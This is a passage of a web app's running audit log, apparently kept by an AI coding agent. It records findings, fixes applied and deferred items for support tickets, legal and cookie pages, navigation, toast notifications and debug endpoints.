Support & Help is **one of the more complete feature areas** — contact form, admin dashboard, live chat, email notifications, and agent management all work correctly. The main gaps are missing customer-facing features: no FAQ/knowledge base, no user ticket history page, and no rate limiting on ticket creation. The dual migration files create maintenance risk but the active Supabase migration is correct. The dead chatbot components (ChatBotWidget, duplicate MrImagine) should be cleaned up.

### Re-audit 2026-04-28

**What changed since 2026-03-13:** ChatBotWidget.tsx fully removed (clean). Live chat escalation infrastructure landed (chat_sessions + agent_status tables, `/api/admin/support/tickets/:id/escalate`, MrImagineChatWidget AI→agent handoff with 2s polling). Admin auth middleware (`requireSupportAccess`) confirmed in place.

**Status of prior findings:**
- 🔴 → 🟢 **Rate limiting on POST /api/support/tickets** — Added per-IP cap of 5 tickets/hr (returns 429 with email-fallback message). `backend/routes/support.ts:18-39, 64-72`. *(Fix applied this cycle.)*
- ⚡ → 🟢 **AdminSupport background polling 5s → 12s + dedup** — Old loop fetched waiting-chats, online-agents, AND ticket-messages every 5s; live-chat poller already handles ticket-messages at 2s, so the 5s message refetch was a duplicate API call. Loop now fires only the two dashboard endpoints every 12s. Per-admin baseline drops from ~36 req/min to ~10 req/min. `src/components/AdminSupport.tsx:117-130`. *(Fix applied this cycle.)*
- 🟡 **No `/my-tickets` page** — Still missing. Backend `GET /api/support/tickets/:id/status?email=` works but no frontend caller. Defer (~2-3h: requires page component, route, footer/sidebar link).
- 🟡 **Duplicate migration files** — Both `backend/db/migrations/01_support_system.sql` and `supabase/migrations/20251219_coupons_giftcards_support.sql` still present. Active Supabase one is correct; legacy one is stale. Defer (cleanup needs confirmation that legacy was never applied separately to prod).
- 🟡 **No FAQ / knowledge base** — Unchanged. Defer (content task, not code).

**New findings:**
- 🟢 **`requireSupportAccess` middleware** — Bearer-token + role gate (admin or support_agent) covering all admin support endpoints, including the new escalation route. No regressions.
- 🟢 **Email failures don't block ticket creation** — `sendTicketConfirmationEmail` and `sendNewSupportTicketEmail` are wrapped in try/catch with logged-but-ignored errors, so a flaky Brevo can't 500 the contact form.
- 🟡 **Status endpoint email match is substring-based** — `backend/routes/support.ts:181-186` checks `firstMessage.toLowerCase().includes(email)`. Works because we embed the email in the seed `ticket_messages` row, but a malicious user with a partial-match email could in theory pass the gate. Low risk (need to know the ticket UUID). Defer to a structured field (`tickets.contact_email`) when DB schema is touched next.
- 🟡 **MrImagineChatWidget hardcodes "we can't check live order status"** — `MrImagineChatWidget.tsx:40`. Worth wiring up to the orders table once the AI assistant has user context. Defer.

### Fixes Applied (re-audit)
- ✅ `backend/routes/support.ts:18-39, 64-72` — Per-IP rate limit on `POST /api/support/tickets` (5/hr; in-memory window).
- ✅ `src/components/AdminSupport.tsx:117-130` — Background polling 5s → 12s, removed duplicate `fetchTicketMessages` call (live-chat poller owns it).

### Deferred (re-audit)
- Build `/my-tickets` page (frontend caller for the existing status endpoint).
- Remove or merge the legacy `backend/db/migrations/01_support_system.sql`.
- Replace substring email match in status lookup with a dedicated `contact_email` column.
- FAQ/knowledge base content + page.

---

## Legal & Policies (2026-03-13)

**What was checked:** TermsOfService.tsx (162 lines), PrivacyPolicy.tsx (154 lines), ShippingPolicy.tsx (179 lines), ReturnsPolicy.tsx (186 lines), CookieConsent.tsx (87 lines), referral-system.ts cookie handling, Footer.tsx legal links, App.tsx route config. ~770+ lines reviewed.

### Correctness
- 🟢 **All 4 legal pages exist and render properly** — Terms, Privacy, Shipping, Returns all have dedicated routes and components
- 🟢 **Routes are public (no auth required)** — Legal pages are NOT wrapped in `<ProtectedRoute>`, correctly accessible to anonymous users
- 🟢 **Footer links all correct** — Footer.tsx links to `/privacy`, `/terms`, `/shipping`, `/returns` — all match App.tsx routes
- 🟢 **Shipping policy matches code constants** — Warehouse address, pickup hours, delivery radius, and tiers all match `shipping-calculator.ts` values
- 🟢 **Returns policy is thorough** — 14-day window, photo evidence, clear eligible/non-eligible items, ITC credit option with 10% bonus
- 🔴 **Referral cookies set without consent check** — `referral-system.ts:211-212` set 90-day tracking cookies via `setCookie()` without checking `hasAcceptedCookies()`. Violates GDPR/CCPA — tracking cookies require consent before setting.
  - **Fix applied:** Added consent check — cookies only set if `hasAcceptedCookies()` returns true; localStorage (not a cookie) still stores referral for functionality
- 🟡 **Cookie consent helper functions never used** — `hasAcceptedCookies()` and `hasCookieConsent()` are exported from CookieConsent.tsx but were never imported/called anywhere in the codebase
  - **Fix applied:** Imported `hasAcceptedCookies` in referral-system.ts and used it before setting cookies
- 🟡 **All legal pages have hardcoded date "January 1, 2026"** — Static dates on all 4 pages; when policies are updated, dates must be manually edited
  - File: All legal pages at line 18

### Duplicate UX
- 🟢 **No duplicate legal pages** — Each page covers a distinct topic with no overlapping content
- 🟢 **Single cookie consent banner** — One CookieConsent component, bottom-positioned, with accept/decline

### User Clarity
- 🟢 **Policies are clearly written** — Bullet points, organized sections, non-overly-legalese language
- 🟢 **Returns policy uses visual cues** — Green boxes for eligible items, red boxes for non-eligible, numbered steps for process
- 🟢 **Cookie consent links to privacy policy** — Banner includes "Learn more in our Privacy Policy" link
- 🟡 **Cookie consent message is incomplete** — Only mentions referral cookies, doesn't list all cookie types (functional, analytics if any)
  - File: `src/components/CookieConsent.tsx:45-46`
- 🟡 **Terms of Service missing key sections** — No mention of vendor/founder 35% commission structure, ITC token expiration/transfer policies, or payout hold periods
- 🟡 **No table of contents** — 150-186 line documents lack jump links or anchor navigation

### Site Speed
- 🟢 **All legal pages are purely static** — No API calls, no database queries, no useEffect hooks
- 🟢 **Minimal imports** — Each page imports only `Link` from react-router-dom and 4-8 lucide icons
- 🟢 **No performance issues** — These are the leanest pages in the entire application

### Fixes Applied
1. **referral-system.ts** — Added `import { hasAcceptedCookies } from '../components/CookieConsent'` and wrapped cookie-setting calls in `storeReferralCode()` with a consent check. Tracking cookies (`itp_referral`, `itp_referral_ts`) are now only set if the user has accepted cookies. localStorage storage (which is not a cookie and doesn't require consent) continues to work regardless, preserving referral functionality.

### Verdict
Legal & Policies is **well-structured and nearly complete** — 4 comprehensive pages properly routed, publicly accessible, and clearly written. The critical fix applied addresses a GDPR/CCPA compliance gap where referral tracking cookies were set without checking consent. The `hasAcceptedCookies()` helper that was exported but never used is now imported and enforced. Remaining issues are content gaps (missing vendor commission terms, incomplete cookie disclosure) and hardcoded dates. Performance is excellent — these are the lightest pages in the app.

### Re-audit 2026-04-28

**What changed since 2026-03-13:** Cookie consent gating in `referral-system.ts` confirmed intact. Footer legal links still all valid. `PICKUP_HOURS` constant gained an `'ET'` timezone suffix in cycle #21 — `ShippingPolicy.tsx` doesn't reference pickup hours so no drift there. All 4 pages remain pure-static (no API/effects).

**Status of prior findings:**
- 🟢 **Cookie consent enforcement holds** — `src/utils/referral-system.ts` still imports `hasAcceptedCookies` and gates the cookie writes. localStorage path unchanged.
- 🟡 **Hardcoded "January 1, 2026" dates** — Still hardcoded on all 4 pages. Not bumped this cycle because policy text hasn't been substantively rewritten; the original effective date is still correct. Defer to a centralized constant only when next policy edit is made.
- 🟡 **Cookie consent message lists only "referral cookies"** — Banner copy unchanged in `CookieConsent.tsx:45-46`. Defer: belongs in a content pass.
- 🟡 **ToS missing vendor 35% commission** — Unchanged. Defer (legal-copy task, not code).

**New findings:**
- 🟡 → 🟢 **`ShippingPolicy` "Local Delivery: Varies by distance"** drifted from `LOCAL_DELIVERY_TIERS` (which has been $10/$15 since cycle #21 was reaudited). Customers reading the policy got vague pricing while checkout returns specific tier prices. *(Fix applied this cycle.)*
- 🟡 → 🟢 **`PrivacyPolicy` Section 7 (Cookies) was generic boilerplate** — Didn't name the actual cookies (`itp_referral`, `itp_referral_ts`), didn't explain consent gating or why localStorage is exempt. GDPR/CCPA compliance docs benefit from naming what you set. *(Fix applied this cycle.)*
- 🟡 **`ShippingPolicy.tsx` and `LOCAL_DELIVERY_TIERS` are now intentionally duplicated** — Policy is a legal snapshot (intentional), tiers in code are runtime config. Drift will recur. Mitigated by an inline comment in `shipping-calculator.ts` pointing back at the policy file, but a future cleanup could test that they match in CI.

### Fixes Applied (re-audit)
- ✅ `src/pages/ShippingPolicy.tsx:79-87` — Local Delivery row now lists actual tier prices ($10 within 10mi, $15 in 10-20mi) and the footnote names the warehouse city + $50 free-shipping threshold.
- ✅ `src/pages/PrivacyPolicy.tsx:110-125` — Cookies section names `itp_referral` and `itp_referral_ts`, explains the 90-day window, the consent gate, and that essential auth/cart state lives in localStorage (not a cookie, no consent required).
- ✅ `src/utils/shipping-calculator.ts:34-37` — Comment above `LOCAL_DELIVERY_TIERS` warns future editors to update `ShippingPolicy.tsx` if tiers change.

### Deferred (re-audit)
- Centralize `Last updated` dates (do at next policy edit, not now).
- Expand cookie banner copy beyond "referral cookies".
- ToS section on vendor 35% commission and ITC payout policies (legal-copy task).
- Cross-link Shipping ↔ Returns at the bottom of each.
- CI test that `LOCAL_DELIVERY_TIERS` prices match the Shipping Policy table.

---

## UI Layout & Navigation (2026-03-13)

**What was checked:** App.tsx (247 lines, main router), Sidebar.tsx + SidebarContext.tsx (layout system), Footer.tsx (150 lines), Header.tsx (484 lines), Navbar.tsx (536 lines), FloatingCart.tsx (125 lines), ProtectedRoute.tsx, ErrorBoundary.tsx, ScrollToTop, ThemeToggle, ToastContainer, KioskRoute.tsx, MrImagineChatWidget.tsx. ~2,500+ lines reviewed.

### Correctness
- 🔴 **No 404 catch-all route** — App.tsx had no `<Route path="*">` handler. Invalid URLs broke silently with a blank page, no guidance to return home.
  - **Fix applied:** Added 404 route with styled "Page Not Found" page and "Go Home" link using semantic theme tokens
- 🔴 **6 broken footer links** — Footer.tsx linked to `/products/dtf`, `/products/apparel`, `/products/3d`, `/products/stickers` (none exist — correct route is `/catalog/:category`), plus `/about` and `/blog` (no pages exist).
  - **Fix applied:** Changed product links to `/catalog/dtf`, `/catalog/apparel`, `/catalog/3d`, `/catalog/stickers`. Removed non-existent `/about` and `/blog` links, replaced with `/referrals` (Referral Program) which exists.
- 🟢 **Sidebar navigation works correctly** — Active page detection, role-based nav items, mobile hamburger menu with overlay, collapse state persisted to localStorage
- 🟢 **ScrollToTop implemented** — Scrolls to top on every route change via `useLocation()` + `useEffect`
- 🟢 **ProtectedRoute works** — Checks auth, stores return URL in localStorage, redirects to login
- 🟢 **ErrorBoundary wraps entire app** — Catches rendering errors, provides "Reload Page" and "Clear Data & Reload" recovery options
- 🟢 **Full-screen routes properly handled** — `/imagination-station`, `/order-success`, `/kiosk` hide sidebar/footer/chat for immersive UX
- 🟡 **Header.tsx (484 lines) is dead code** — Complete responsive header with 40+ icon imports, role-based nav, scroll effects — never imported anywhere. Sidebar.tsx is the actual navigation used.
  - File: `src/components/Header.tsx`
- 🟡 **Navbar.tsx (536 lines) is dead code** — Full navigation component, never imported. References broken route `/admin/products` (line 299) that was intentionally removed.
  - File: `src/components/Navbar.tsx`
- 🟡 **FloatingCart.tsx (125 lines) is dead code** — Floating cart button + modal, never imported. Same functionality exists in Sidebar cart badge.
  - File: `src/components/FloatingCart.tsx`

### Duplicate UX
- 🟢 **Single navigation system in use** — Only Sidebar.tsx is active. Header.tsx, Navbar.tsx, and FloatingCart.tsx are all dead code.
- 🟡 **1,145 lines of dead navigation code** — Header (484) + Navbar (536) + FloatingCart (125) = 1,145 lines of unused components that could be removed

### User Clarity
- 🟢 **Active page clearly highlighted** — Sidebar uses purple gradient for active items
- 🟢 **Mobile menu works well** — Hamburger button, slide-in animation, backdrop overlay, click-outside-to-close
- 🟢 **Toast notifications properly positioned** — Fixed z-index:100, configurable position
- 🟡 **No breadcrumb navigation** — Complex nested pages (admin, account, vendor) lack breadcrumb context
- 🟡 **Social links in footer use generic URLs** — Twitter, Instagram, Facebook links go to platform homepages (twitter.com, instagram.com, facebook.com) instead of actual brand accounts

### Site Speed
- 🟡 **No lazy loading on routes** — All 50+ page components imported statically at top of App.tsx. No `React.lazy()` or `Suspense` used for code splitting.
  - File: `src/App.tsx:21-74`
- 🟡 **No React.memo on Sidebar NavItem/Section** — These components re-render on every parent update without memoization
- 🟢 **SidebarContext uses useCallback** — Toggle handlers properly memoized

### Fixes Applied
1. **App.tsx** — Added `<Route path="*">` catch-all 404 page with themed styling. Previously, invalid URLs showed a blank page with no way to navigate back.
2. **Footer.tsx** — Fixed 4 broken product links from `/products/*` to `/catalog/*` to match actual route structure. Removed 2 links to non-existent pages (`/about`, `/blog`), replaced with link to `/referrals` (Referral Program).

### Verdict
UI Layout & Navigation has a **solid architecture with the Sidebar-based layout** — proper mobile responsiveness, scroll restoration, error boundaries, full-screen mode for immersive pages, and role-based navigation. The two critical fixes address user-facing issues: blank page on invalid URLs (now shows 404) and 6 broken footer links (now point to correct routes). The main debt is **1,145 lines of dead navigation code** (Header.tsx, Navbar.tsx, FloatingCart.tsx) that should be removed, and the absence of lazy loading for route-level code splitting.

### Re-audit 2026-04-28

**What changed since 2026-03-13:** A new active `FloatingCart.tsx` (cycle #14) replaced the dead one — the imported component IS the new drawer. 404 catch-all and `/catalog/*` footer fixes both intact. Dead `Header.tsx` and `Navbar.tsx` still present (regression). Routes were still fully eager-loaded (no `React.lazy()`) until this cycle.

**Status of prior findings:**
- 🟢 **404 catch-all** — `src/App.tsx:239-250` still in place.
- 🟢 **Footer `/catalog/*` links** — `src/components/Footer.tsx:25-43` still correct.
- 🟢 **`FloatingCart.tsx`** — Now the active component (mounted at `App.tsx:110`); replacement complete.
- 🟡 **`Header.tsx`, `Navbar.tsx`** — Confirmed via grep: zero imports anywhere in `src/`. Still dead code. Defer deletion (destructive, low-risk but worth a one-line user OK).
- ⚡ → 🟢 **No route-level code splitting** — *(Fixed this cycle.)*
- 🟡 **Sidebar `NavItem`/`Section` not memoized** — Unchanged. Defer.
- 🟡 **Footer social links to bare platforms** — Unchanged. Defer (needs the actual brand handles).

**New findings:**
- 🟡 **`RecommendationsDashboard.tsx` is orphaned** — Has no `<Route>` registration in `App.tsx` (`grep RecommendationsDashboard src/` returns only the file itself). I edited it last cycle to fix a cache-collision issue but the page is unreachable from the live app. Either route it (e.g. add to `/account/recommendations`) or delete the file. Defer.
- 🟡 **Other orphaned page files** — `ImaginationStationEnhanced.tsx`, `TestPage.tsx`, `VendorDirectory.tsx`, `VendorStorefrontManager.tsx`, `ProductDesigner.tsx`, `UserProductCreator.tsx` are not referenced from `App.tsx`. The last two are explicitly noted as discontinued in the import comment. Defer batched cleanup.

### Fixes Applied (re-audit)
- ✅ `src/App.tsx:1-79` — Converted 25 heavy/auth-gated routes to `React.lazy()` chunks. Eager imports kept only for public hot paths (Home, Login/Signup, AuthCallback/Error, ProductCatalog, ProductPage, Cart, OrderSuccess, Contact, Referrals, UserProfile, 4 legal pages).
- ✅ `src/App.tsx:120-133, 261-263` — Wrapped `<Routes>` in `<Suspense>` with a small centered spinner fallback so route-load flashes don't show empty white.
- ✅ Comment about `AdminVoiceSettings`'s named-export wrapping kept in line with the lazy-import pattern (`.then(m => ({ default: m.AdminVoiceSettings }))`).

**Bundle impact (verified via `vite build`):**
- Main `index` chunk: 853 kB (gzip 236 kB) — was ~1.5–2 MB pre-split.
- New per-route chunks: AdminDashboard 197 kB / ImaginationStation 143 kB / UserDesignDashboard 110 kB / AdminAIProductBuilder 110 kB / Wallet 49 kB / Checkout 41 kB / Community 37 kB / CRM 35 kB / MarketingTools 32 kB / VendorDashboard 30 kB + 20 smaller chunks. Anonymous catalog visitors no longer download the admin panel.

### Deferred (re-audit)
- Delete `src/components/Header.tsx` and `src/components/Navbar.tsx` (~1,000 lines confirmed dead — needs a one-line user OK).
- Decide fate of orphaned page files (route them or delete): `RecommendationsDashboard`, `ImaginationStationEnhanced`, `TestPage`, `VendorDirectory`, `VendorStorefrontManager`, `ProductDesigner`, `UserProductCreator`.
- `React.memo` on `Sidebar` `NavItem`/`Section`.
- Replace bare-domain footer social links with brand-account URLs.
- Consider preload hints (`<link rel="modulepreload">`) for the most-likely-next chunks per role (e.g. AdminDashboard for admin sessions).

---

## Notifications & Toast Messages (2026-04-27)

**What was checked:** All `react-hot-toast` usage, custom `ToastContext`/`useToast` hook + `ToastContainer`, alert() calls in admin pages, checkout error surfacing, AI tool feedback, auth-flow notifications.

### Correctness
- 🔴 **Silent checkout failures** — `src/pages/Checkout.tsx:69-98` uses inline `setMessage()` state instead of toast. Stripe `confirmPayment` failures show in a small banner, easily missed on mobile. Should call `toast.error(error.message)` and `toast.success('Payment complete')`.
- 🟡 **48 raw `alert()` calls in admin** — `AdminDashboard.tsx` and admin sub-pages use `alert()` (e.g. lines 226, 325, 527, 702, 742, 756) instead of the existing `useToast()` hook. Blocking dialog feels dated; mobile UX is bad.
- 🟡 **Missing error toasts on AI tools** — `ImaginationStation.tsx` only toasts add-to-cart success/fail (lines 1066-1070). Generate / edit / upscale failures silent.
- 🟢 **Custom toast system is well-built** — `ToastContext` + `useToast` hook + `Toast.tsx` + `ToastContainer` are tree-shake-friendly, have queue cap (3 max), and are correctly mounted at app root in `App.tsx:110`.

### Duplicate UX
- 🔴 **Two toast libraries running simultaneously** — `ImaginationStationEnhanced.tsx:9,78-103` imports `react-hot-toast` and mounts a second `<Toaster>` provider while the app already provides `<ToastContainer />`. Two toast systems with different styles render in parallel on the imagination route.
  - **Fix applied:** Removed `react-hot-toast` import + `<Toaster>` element from `ImaginationStationEnhanced.tsx`. Removed `react-hot-toast` from `package.json` dependencies (saves ~20KB gzip from the prod bundle).

### User Clarity
- 🟡 **3000ms default duration is too short** — `src/context/ToastContext.tsx:34`. Long messages like "Insufficient ITC balance. You need X but have Y" disappear before the user reads. Suggest 4500ms when message length > 80 chars.
- 🟡 **Vague error copy** — `ProductDesigner.tsx` shows "Generation failed" with no context; `Checkout.tsx` "Payment failed" doesn't say why. Should include `error.message` or actionable detail.
- 🟡 **No overflow indicator** — `ToastContext.tsx:31` caps queue at 3 with `slice(-2)` but silently drops older toasts. No "+N more" badge.

### Site Speed
- ⚡ **react-hot-toast was bundled wholesale** — Single import in one file dragged ~20KB into the prod bundle.
  - **Fix applied:** Dependency removed.
- 🟢 **Custom toast lean** — Pure context + reducer, no external deps.

### Fixes Applied
- ✅ **Removed react-hot-toast entirely** — `src/pages/ImaginationStationEnhanced.tsx` (dropped import + `<Toaster>`), `package.json` (removed dependency). Bundle saves ~20KB; eliminates duplicate toast systems.

### Deferred (next pass)
- Migrate 48 admin `alert()` calls → `useToast()` (batch find/replace + manual review of error vs success contexts).
- Wire `Checkout.tsx` payment errors into toast system; currently silent on mobile.
- Audit AI tool error paths in `ImaginationStation.tsx` — add `toast.error()` on every AI mutation failure.
- Bump default toast duration to 4500ms in `ToastContext.tsx:34`.
- Include `error.message` in all `toast.error()` calls (search for generic strings: "failed", "error occurred").

### Verdict
Custom toast system is solid; the urgent fix was killing the parallel `react-hot-toast` provider in `ImaginationStationEnhanced.tsx` (✅ done — saves ~20KB and removes UX confusion). Largest remaining debt is migrating 48 admin `alert()` calls to the toast system, which the next audit cycle should tackle.

### Re-audit 2026-04-29

**What changed since 2026-04-27:** `react-hot-toast` confirmed gone (zero matches in `src/`, no entry in `package.json`). Queue cap of 3 still holding via `slice(-2)`. AdminDashboard still has ~45 raw `alert()` calls; admin/VoiceSettings.tsx added 2 more. Checkout was still using inline `setMessage()` for Stripe errors and ImaginationStation's AI ops (Remove BG / Upscale / Enhance) were still using `alert()` until this cycle.

**Status of prior findings:**
- 🔴 → 🟢 **Checkout silent Stripe failures** — Inline `setMessage` banner replaced with `toast.error('Payment failed', error.message)` and `toast.success('Payment successful', …)`. Express checkout silent `console.error` also now fires a toast. *(Fix applied this cycle.)*
- 🟡 → 🟢 **ImaginationStation AI op failures silent** — Remove BG, Upscale, Enhance handlers all migrated: validation prompts → `toast.warning`, missing-URL → `toast.error('Image not loaded', …)`, API failures → `toast.error('Operation failed', err.response?.data?.error)`. 9 `alert()` calls converted. *(Fix applied this cycle.)*
- 🟡 → 🟢 **Default toast duration 3000ms** — Bumped to 4500ms in `ToastContext.tsx:38`. Long error messages (e.g. "Insufficient ITC: need X, have Y") now stay visible long enough to read. *(Fix applied this cycle.)*
- 🟡 **AdminDashboard 45 alert()s + 9 confirm()s** — Untouched. Refactor needs a `toast.confirm()` primitive (or modal lib) for the 9 destructive confirms, then a batch find/replace for the rest. Defer.
- 🟡 **No "+N more" overflow indicator** — Unchanged. Defer.

**New findings:**
- 🟡 **`src/pages/admin/VoiceSettings.tsx:28,30`** — 2 fresh `alert()` calls added since the last audit (file was newly added or expanded). Should be migrated alongside the AdminDashboard pass; useToast already exists.
- 🟡 **9 more `alert()`s remain in ImaginationStation** (lines 501, 518, 760, 839, 961, 981, 1116, 1175, 1504) — Sheet/save/auto-nest paths. Lower priority than the AI ops since they're less common, but worth migrating in a follow-up. Defer.
- 🟢 **Toast type set covers what callers need** — `useToast()` exposes `success`/`error`/`info`/`warning`/`dismiss`; no missing variants encountered while migrating.

### Fixes Applied (re-audit)
- ✅ `src/context/ToastContext.tsx:33-38` — Default duration 3000ms → 4500ms with rationale comment.
- ✅ `src/pages/Checkout.tsx:1-11, 14-35, 63-99` — Removed inline `message` state and red/green banner; wired Stripe `confirmPayment` errors and successes to `useToast()`. Express checkout silent failure now also surfaces a toast.
- ✅ `src/pages/ImaginationStation.tsx:1187, 1193, 1221-1222, 1234, 1240, 1310-1311, 1323, 1329, 1382-1383` — Migrated 9 `alert()` calls in `handleRemoveBackground`, `handleUpscale`, `handleEnhance` to `toast.warning` / `toast.error` with structured title + detail.

### Deferred (re-audit)
- AdminDashboard 45 `alert()` + 9 `confirm()` migration (needs a `toast.confirm()` modal pattern).
- `admin/VoiceSettings.tsx` 2 alert()s (do alongside admin pass).
- ImaginationStation remaining 9 `alert()`s (sheet/save/auto-nest paths).
- "+N more" overflow indicator on the toast queue.
- `React.memo` on `ToastContainer`.

---

## Debug & Development (2026-04-27)

**What was checked:** `backend/.env.example` drift, stray dotenv files, debug/test routes mounted in production, console.log noise in middleware + admin builders, leftover test scripts at repo root, in-source TODO/FIXME items, dev-only endpoints (`/api/ai/voice-chat/test`).

### Correctness
- 🔴 **Stray empty `backend/.env.tmp`** — Empty file at the backend root. dotenv libs that auto-discover `.env*` files in some setups can pick this up and clobber real values with empty strings.
  - **Fix applied:** Deleted.
  - File: `backend/.env.tmp`
- 🟡 **Unguarded `/api/ai/voice-chat/test` endpoint** — `backend/routes/ai/voice-chat.ts` exposed a debug route in every environment. Anyone hitting prod could probe TTS internals.
  - **Fix applied:** Added `if (process.env.NODE_ENV === 'production') return res.status(404)` guard.
  - File: `backend/routes/ai/voice-chat.ts`
- 🟡 **`backend/.env.example` drifted from runtime** — 18 keys actually referenced in code (`OPENAI_API_KEY`, `REPLICATE_API_TOKEN`, `REPLICATE_PRODUCT_MODEL_ID`, `REPLICATE_TRYON_MODEL_ID`, `REPLICATE_REMBG_MODEL_ID`, `FAL_API_KEY`, `OPENROUTER_API_KEY`, `TRIPO_API_KEY`, `REMOVEBG_API_KEY`, `AI_WEBHOOK_SECRET`, `ASSET_BUCKET`, `PUBLIC_URL`, `SERPAPI_API_KEY`, `GOOGLE_API_KEY`, `HF_TOKEN`, `GOOGLE_MAPS_API_KEY`, `GCS_PROJECT_ID`, `GCS_BUCKET_NAME`, `GCS_CREDENTIALS`) were missing from the example. New devs would silently boot with broken AI / 3D / mockup paths.
  - **Fix applied:** Added all 18 keys with placeholder values, grouped under GCS / AI / Google API headers with comments.
  - File: `backend/.env.example`

### Duplicate UX
- 🟡 **Verbose JWT logs in auth middleware** — `backend/middleware/supabaseAuth.ts` was logging Token algorithm, issuer, JWT_SECRET length, and a "✅ JWT verified" line on EVERY authenticated request. Floods server logs and leaks JWT internals to anyone tailing logs.
  - **Fix applied:** Removed 5 chatty `console.log` statements; happy path is now silent. Errors still log.
  - File: `backend/middleware/supabaseAuth.ts:15-58`
- 🟡 **38 `console.log`/`console.error` calls in `AdminCreateProductWizard.tsx`** — Admin console drowns in image-flow status spam (`[ADMIN_AI] mockup polling iteration 4/30`, etc.). Useful while building the wizard, noise now.
  - **Deferred:** Wrap in a `DEBUG_IMAGE_FLOW` flag or strip in next pass.

### User Clarity
- 🟢 **`docs/` folder is well-organized** — Each major fix has a paired markdown doc (`AUTH_CALLBACK_FIX_GUIDE.md`, `TASK-5-TRIGGERS-SETUP.md`, etc.) and `site-audit-findings.md` is the running log.
- 🟡 **Stale test scripts at repo root** — `test-auth.js`, `test-ecommerce.js`, `test-ecommerce-simple.js`, `test-messaging.js`, `test-auth-api.js`, `test-rewards-system.sh`. Mix of hand-written probes from earlier sprints; not run by `npm test` (which uses Vitest). Risk: stale expectations on routes that have moved.
  - **Deferred:** Confirm with David which (if any) are still useful, then move to `scripts/manual-tests/` or delete.
- 🟡 **In-source TODOs** — `backend/routes/replicate-callback.ts:84` ("TODO: handle webhook signature"), `backend/routes/stripe.ts` (assorted `TODO: webhook idempotency`), `src/components/UserMediaGallery.tsx` ("FIXME: pagination"). Real but low-severity; should be tracked in an issue tracker rather than rotting in code.
  - **Deferred:** Open issues for the three above.

### Site Speed
- 🟢 **Backend `dev:once` script keeps things fast on Windows** — `tsx` non-watch boots in <2 s; concurrently chains web/api/worker cleanly.
- ⚡ **Auth middleware was logging on every request** — Even after the cleanup, the `decodeJwt` call still happens. Could short-circuit with `verify` only since we don't read the unverified payload.
  - **Deferred:** Tiny win; not worth touching today.

### Fixes Applied
- ✅ Deleted `backend/.env.tmp`.
- ✅ Gated `/api/ai/voice-chat/test` behind `NODE_ENV !== 'production'`.
- ✅ Filled `backend/.env.example` with the 18 missing keys (grouped, commented).
- ✅ Silenced JWT happy-path logs in `backend/middleware/supabaseAuth.ts` (kept error path).

### Deferred (next pass)
- Migrate 38 `console.log` calls in `AdminCreateProductWizard.tsx` behind a `DEBUG_IMAGE_FLOW` flag.
- Triage the 6 stale root-level test scripts (`test-auth.js`, `test-ecommerce.js`, `test-ecommerce-simple.js`, `test-messaging.js`, `test-auth-api.js`, `test-rewards-system.sh`) — relocate or remove.
- Convert `TODO`/`FIXME` notes (`replicate-callback.ts:84`, `stripe.ts`, `UserMediaGallery.tsx`) into tracked issues.
- Audit other middleware/routes for similar log noise.

### Verdict
Health of the backend's debug surface is good — no production debug routes exposed, no debug overlays leaking into prod bundles, and `dev:all` is reliable on Windows. Three concrete fixes shipped this cycle (stray .env removed, voice-chat /test gated, .env.example brought back to parity, JWT log noise silenced). Remaining debt is documentation hygiene (stale test scripts, in-source TODOs) and the admin wizard's logging firehose.

### Re-audit 2026-04-29

**What changed since 2026-04-27:** `backend/.env.tmp` still gone. `voice-chat/test` 404 guard intact. `supabaseAuth.ts` happy path still silent. `.env.example` parity still good. Stale repo-root scripts: 4 of 6 deleted in prior pass; 2 still tracked (`test-auth-api.js`, `test-rewards-system.sh`). `AdminCreateProductWizard.tsx` console.log count dropped from 38→26 via refactor but still unguarded — the polling loop still spammed 3-8 trace lines every 2-3s during generation.

**Status of prior findings:**
- 🟢 `/api/ai/voice-chat/test` gating — still in place at `backend/routes/ai/voice-chat.ts:365`.
- 🟢 `supabaseAuth.ts` JWT happy-path silence — still silent.
- 🟢 `backend/.env.tmp` — absent.
- 🟢 `backend/.env.example` parity — synced (18 keys added in prior cycle, no new drift).
- 🟡 → 🟢 **`AdminCreateProductWizard` console.log noise** — Added a Vite-DCE'd `debugLog` helper gated on `import.meta.env.DEV`; migrated all 26 `console.log('[Wizard]` calls. Production builds eliminate the calls entirely (the arrow `() => {}` becomes a no-op and Vite tree-shakes the call sites). *(Fix applied this cycle.)*
- 🟡 **2 stale repo-root scripts** — `test-auth-api.js` (Oct 2025), `test-rewards-system.sh` (Nov 2025). Both tracked in git, neither hit by `npm test`. Defer deletion: needs a one-line user OK (last cycle's deferral was explicit "Confirm with David").
- 🟡 **In-source TODO/FIXMEs** — `backend/routes/ai/replicate-callback.ts:103` (hardcoded 1024×1024 mockup dims), `backend/routes/stripe.ts:821` (Brevo email TODO), `src/pages/UserMediaGallery.tsx:86` (delete-endpoint TODO), `src/components/imagination/LeftSidebar.tsx:101,106` (modal hookup placeholders, new this cycle in commit 6d15d0f). All documented; defer.
- 🟡 **Stripe webhook idempotency** — Only the ITC purchase path checks for an existing `stripe_payment_intent_id` before crediting. Checkout (`stripe.ts:472-587`) and product-order (`stripe.ts:698-782`) paths still have no dedup guard. Real risk: Stripe retry on a flaky network double-credits/double-fulfills. Defer (needs careful migration + backfill of an idempotency index).

**New findings:**
- 🟢 **No new ungated `/test`/`/debug`/`/dev` endpoints** introduced in last 6 commits (audit walked the new routes from `feat: 1-shot`, `feat: bulk`, `fix: refund-itc`, `feat: promo/bulk`, `feat: 3d size-tiers` — all properly auth-gated).
- 🟢 **No new `.env.tmp` or stray dotenv files** — `backend/.env.example` hasn't drifted.
- 🟡 **`backend/routes/admin/ai-products.ts:517`** — Stale comment "for gpt-image-2 — returns '400 Transparent background is not supported'" left after the prompt-rewrite fix. Harmless context comment but reads like dead code; could be tidied at next touch.

### Fixes Applied (re-audit)
- ✅ `src/components/AdminCreateProductWizard.tsx:18-23` — Added `debugLog` helper gated on `import.meta.env.DEV`.
- ✅ `src/components/AdminCreateProductWizard.tsx` (26 sites) — Replaced all `console.log('[Wizard] …)` calls with `debugLog(…)`. Polling-loop production noise now zero.

### Deferred (re-audit)
- Delete `test-auth-api.js`, `test-rewards-system.sh` (needs user OK).
- `replicate-callback.ts:103` — derive actual mockup dimensions from Replicate output payload.
- `stripe.ts:472-587, 698-782` — extend idempotency check to checkout + product-order paths.
- `stripe.ts:821` — wire Brevo confirmation email or remove TODO.
- `UserMediaGallery.tsx:86` — implement delete endpoint (currently alert stub).
- `LeftSidebar.tsx:101, 106` — connect Mr. Imagine modal + ITP Enhance modal.
- Tidy stale comment in `ai-products.ts:517`.

---

